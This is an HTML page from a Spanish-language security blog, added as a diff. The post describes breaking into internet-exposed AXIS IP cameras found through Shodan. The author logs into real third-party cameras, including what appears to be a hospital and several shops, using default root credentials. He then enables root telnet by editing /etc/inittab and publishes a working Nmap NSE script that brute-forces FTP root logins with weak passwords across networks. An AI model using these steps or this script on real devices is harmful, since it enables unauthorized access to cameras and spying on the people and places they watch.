@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Tomando El Control De Una Camara AXIS (I) - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="Hay veces en las que se me da por jugar con Shodan, realizando busqueda de routers, camaras IP u otros dispositivos, esta vez me puse a indagar las &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/01/17/tomando-el-control-de-una-camara-axis-i/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Tomando El Control De Una Camara AXIS (I)</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-17T12:37:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:37 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div style="text-align: center;"><a href="http://i.imgur.com/5EQZHzO.jpg?1" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/5EQZHzO.jpg?1" height="400" width="400" /></a></div>Hay veces en las que se me da por jugar con <b>Shodan</b>, realizando  busqueda de routers, camaras IP u otros dispositivos, esta vez me puse a  indagar las camaras <b>AXIS</b>&nbspque&nbspse&nbspencontraban&nbspen&nbspla&nbspred&nbsppublica.<br />Simplemente poniedon AXIS en el buscador podemos encontrar unas cuantas disponibles,  sin embargo la gran mayoria dispone de  autentificacion HTTP Digest  para acceder al panel (pero no todas) incluso muchas poseen passwords  como el clasico 123456.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/bdRF413.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/bdRF413.png" height="384" width="640" /></a></div><br /><br /><br />Entonces me puse a averiguar informacion de este tipo de camaras, que  bien son dispositivos con Linux arm* embebido y otra cosa interesante  es que el user por defecto es root, asi que comence a probar intentos de  logueo con:<br /><br /><ul><li>root:123456</li><li>root:root</li></ul><br />Siempre a travez de las direcciones  que me arrojaba shodan y me cruze con una gran cantidad de dispositivos  que realmente estaban configurados con esas credenciales y es mas  algunos ni siquiera tenian activado la autentificacion por http.<br /><br />Me tope con algunas como estas:<br /><br /><i>Lo que pareciera ser un hospital.</i><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/s0ANBji.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/s0ANBji.png" height="490" width="640" /></a></div><i>&nbsp;Un pequeño local de electrodomesticos en Arabia Saudita</i><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/WkKgbxj.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/WkKgbxj.png" height="518" width="640" /></a></div><br /><i>&nbsp;Una pancheria en Medellin Colombia.</i><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/GU7RYI3.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/GU7RYI3.png" height="416" width="640" /></a></div><br /><br /><br />Ahora que ya habia accedido al panel, queria ver la forma de tomar el control del mini OS GNU.<br /><br />Por empezar estos dispositivos cuentan con un servidor ftp  configurado con las mismas credenciales que el http, pero por defecto el  demonio telnet se encuentra desabilitado al inicio, pero esto no quita  que pueda ser activado a travez del servidor web utilizando un editor de  ficheros dentro de las opciones del sistema.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/bcVGCF0.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/bcVGCF0.png" height="440" width="640" /></a></div><br />Solo basta con editar el fichero <b>/etc/inittab</b> y descomentar la linea:<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ #tnet:35:once:/usr/sbin/telnetd ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/j8iNHpW.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/j8iNHpW.png" height="354" width="640" /></a></div><br />Salvar los cambios, y reiniciar el dispositivo.<br /><br />Esto podemos hacerlo mediante el panel.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/BwaG0JK.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/BwaG0JK.png" height="388" width="640" /></a></div><br /><br />O bien por ftp con el siguiente comando.<br /><br /><script class="brush: bash" type="syntaxhighlighter"><![CDATA[ quote site reboot ]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/7u4SzOM.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/7u4SzOM.png" /></a></div><br />Una vez iniciado el sistema seremos capaces de establecer una conexion por telnet como usuario root.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/lHSLaKI.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/lHSLaKI.png" height="408" width="640" /></a></div><br />No quedando satisfecho con la pobre cantidad de camaras que me  proveia shodan me dispuse a codear un <b>NSE script</b> para realizar sondeos  con nmap y ver que me encontraba.<br />La manera de identificar estos juguetitos es mirando el banner que  tira el ftp, una vez identificado, el script simplemente intenta  loguearse como root, utilizando contraseñas debiles y ademas comprueba  si el panel se encuentra protegido.<br /><br /><script class="brush: perl" type="syntaxhighlighter"><![CDATA[ description = [[ Script que se encarga de buscar camaras AXIS que contengan credenciales debiles o sin autentificacion HTTP digest. ]]  author = "[Q]3rV[0]" license = "Same as Nmap--See http://nmap.org/book/man-legal.html" categories = {"brute", "auth"}  --- --  -- @usage nmap --script=axis_search -vv -T4 -Pn -n xx.xx.xxx.x -p80,21 -- @output --PORT   STATE SERVICE --21/tcp open  ftp --80/tcp open  http  --Host script results: --| axis: --|   Host = xxx.x.xxx.3 --|   Version = AXIS M7010 Video Encoder 5.40.6.1 (2011) ready. --|_  Auth = root:root --  ---   local http = require "http" local ftp = require "ftp" local nmap = require "nmap" local stdnse = require "stdnse" local string = require "string" local table = require "table"  hostrule=function(host)     local http_port, ftp_port     http_port=nmap.get_port_state(host, {number=80, protocol="tcp"})     if not http_port and not (http_port.state=="open" or http_port.state=="open|filtered") then         return false     end     ftp_port=nmap.get_port_state(host, {number=21, protocol="tcp"})     if not ftp_port and not (ftp_port.state=="open" or ftp_port.state=="open|filtered") then         return false     end     return true end  local out={}  local dic={'root', 123456, 1234}  local function data_out(out, message_banner, auth, host)     table.insert(out, string.format("Host = %s", host.ip))     table.insert(out, string.format("Version = %s", message_banner))     table.insert(out, string.format("Auth = %s", auth))     return stdnse.format_output(true, out) end  local function http_auth(host)     local response=http.get(host, 80, '/view/viewer_index.shtml')     return response end   action=function(host)     local socket=nmap.new_socket()     socket:connect(host, 21)     local buffer=stdnse.make_buffer(socket, "\r?\n")     local code, message_banner=ftp.read_reply(buffer)     if string.match(message_banner, "AXIS") then         local response=http_auth(host)         if response.status==401 or response.status==404 or response.status==403 then             for n,pass in ipairs(dic) do                 socket:send("USER root\r\n")                 local code, message=ftp.read_reply(buffer)                 if code==331 then                     socket:send("PASS "..pass.."\r\n")                 end                 local code, message=ftp.read_reply(buffer)                 if message == "User logged in, proceed." then                     return data_out(out, message_banner, 'root:'..pass, host)                 end             end         else             return data_out(out, message_banner, 'HTTP Blank Auth :)', host)         end         return data_out(out, message_banner, 'Failed Auth :(', host)     end end  ]]></script> Para terminar dejo una salida del script realizando un sondeo de prueba a la red xx.xxx.xx.x/24<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/yNeg2Th.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/yNeg2Th.png" /></a></div></div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-01-17T12:37:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:37 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/01/17/tomando-el-control-de-una-camara-axis-i/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/01/17/tomando-el-control-de-una-camara-axis-i/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/16/del-spam-la-intrucion/" title="Previous Post: Del Spam a la intrucion">&laquo; Del Spam a la intrucion</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/01/18/explotar-shellshock-en-qmail/" title="Next Post: Explotar Shellshock en QMAIL">Explotar Shellshock en QMAIL &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
